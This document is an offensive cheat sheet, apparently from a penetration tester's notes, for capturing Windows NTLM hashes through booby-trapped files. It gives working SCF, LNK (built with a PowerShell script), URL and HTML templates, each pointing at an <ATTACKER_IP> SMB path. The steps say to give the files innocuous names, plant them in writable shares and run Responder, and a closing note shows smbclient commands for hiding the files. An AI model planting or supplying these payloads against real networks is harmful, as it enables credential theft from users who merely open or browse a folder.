# Automatic on folder visit I: SCF Files
```
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\DesktopSettings.config
[Taskbar]
Command=ToggleDesktop
```
1. Put the contents into a non-suspicious file name like `@DesktopSettings.scf`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (won't work if hidden)
4. Fire responder `responder -I eth0`

# Automatic on folder visit II: LNK Files
```powershell
$Output_For_Lnk = "$pwd\Database.lnk"
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut($Output_For_Lnk)
$lnk.TargetPath = "\\<ATTACKER_IP>\@DB"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Database"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
1. Run the PowerShell script, it will save the `.lnk` file in the current working directory
2. Place the file in the writable SMB share (won't work if hidden)
3. Fire responder `responder -I eth0`

# Works when *Selected*: URL files
```
[InternetShortcut]
URL=file://<ATTACKER_IP>/@IEsettings
```
1. Put the contents into a non-suspicious file name like `IESettings.url`
2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
3. Place the file in the writable SMB share (won't work if hidden)
4. Fire responder `responder -I eth0`

# Must be Clicked to work II: HTML files
```
<img src="\\\\<ATTACKER_IP>\\img">
```
1. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
2. Place the file in the writable SMB share (won't work if hidden)
3. Fire responder `responder -I eth0`

### Note
- you can hide any file when in an `smbclient` prompt using `setmode <FILE_NAM> +h`
- you can unhide any file when in an `smbclient` prompt using `setmode <FILE_NAM> -h`